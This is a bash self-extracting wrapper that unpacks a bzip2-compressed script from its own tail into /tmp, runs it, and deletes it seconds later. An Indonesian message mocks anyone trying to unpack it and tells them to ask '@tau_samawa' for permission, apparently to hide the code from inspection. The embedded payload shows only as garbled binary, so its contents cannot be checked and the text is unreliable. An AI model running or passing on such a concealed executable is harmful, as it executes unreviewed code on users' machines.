#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY��� =��u����?�������PD@  PLa�ʹn�I�pI$	�S�OQ�~�ئژ�bm��'��� �=M�j	DL&�<��yO)� 4A� �h( B��j��z�b��&OS@� 4��4ڀ��@d�F�@ i�@  E4��S�i1ODOA� 4�'�������&�i�!�D�Vc��9�4���c���f��()��_�' I�"��A��c���>��mޛ��_i���@"�~2� �����o{���) �S#B��e��tC�w��j������ѐr��ATGi�2Z��FP��Q#`�@E˪F)��
I�y_rr���~�h�����P�����M�������F���Y��>8`�4�Lhg%+�o�x;y�1Pa4��u/s��+p����NԵH�ͷ�f4�7��c@Su��e���{��?:.�n�b��p��gt�����0������.\�"�2f��׻[k�t�O�V5��2B��3IFb�y<�qu_��rK�13�0 0�~��G[gz��4�k)[he�`�5\@�����$+�i)� �`��iU� "�ԝHUiR+�e�T|�Ƈ?Q�x���VD���9�d�fq7 ŕ{�0�%�ǧ���\�Gߒ�����G�a���ؗ����ۃ�9ϴah�tr�N4���]��Qq<m-T�.����B$ؑ{:�<tM��^��� ��{7���Jf�Y�"���]�C��G��m����Xa�{F��,��)���\#3"���ao�g�k�tU\d�ןjx&�``���[k%!�tc_��W�Z�+��a�;[�(����H��0+�X^*4�����H�,�W��V%�	o����s�R"(Ł�S|�P�l�
A��D9��@ɚ�ĸ�*��RDj�H\AT�c��M���GS���]`�,�����esCZR�0:�r��R0j��p�@8���bv#/5����WK�9s�v^����6-��Z-�jB�f���r2[�QX=�&��R���!�$T̐0@��u!$X�.Z���@�jCn�6}>l$k>���ٚ��^���ad���g�@�D��f��6��*H�j�$	�y�[I�k���	��,�9W�!\S=4l�*��p�!�
����,f'���!�Ã�Rw\��Yy�h��Gg?���b�]"�A`�U�x��X;I��T*ʋ�W�$R+g�@�N㢋�CC+�w�He�'���r<�">�=�V�)��H�/�x`Rd�$�	�si���	k���ϘT�
����P���hl��B���`����jY�+TE(%&T��V@��j�,ș(�Q��F6��̩\챌|���#�(a�7�w,�h�'c�j!0����I�P�� )0��w$S�	x��@